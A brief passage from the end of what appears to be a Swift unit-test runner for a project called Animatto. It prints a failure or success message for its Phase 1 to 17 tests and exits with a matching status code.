            print("❌ Test suite failed!")
            exit(1)
        } else {
            print("🎉 All Animatto Phase 1 through Phase 17 unit tests passed successfully!")
            exit(0)
        }
    }
}
